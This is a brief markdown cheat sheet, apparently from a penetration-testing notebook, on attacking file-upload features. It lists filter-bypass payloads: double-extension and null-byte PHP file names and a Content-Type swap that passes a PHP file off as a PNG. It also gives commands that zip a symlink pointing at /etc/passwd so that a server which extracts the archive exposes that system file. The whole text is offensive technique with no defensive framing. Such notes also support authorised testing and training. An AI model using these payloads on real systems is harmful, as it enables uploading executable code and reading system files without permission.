# File Upload

## Bypass

```
hermes.php.jpg
hermes.php%00.png
```
Changing `Content-Type: application/x-php` to `Content-Type: image/png`

## Unzip symlinks

```bash
ln -s ../../../../../../etc/passwd somelink
zip --symlinks hermes.zip somelink
```